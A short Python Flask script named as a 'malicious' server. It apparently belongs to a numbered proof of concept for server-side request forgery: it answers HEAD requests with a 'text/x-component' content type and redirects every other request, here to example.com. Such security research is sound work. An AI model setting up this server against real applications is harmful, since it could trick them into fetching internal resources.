# sudo apt install -y python3-flask
# python3 -m flask --app 8_malicious_flask_server run

from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        print('calling HEAD')
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    print('calling redirect')
    return redirect('https://example.com')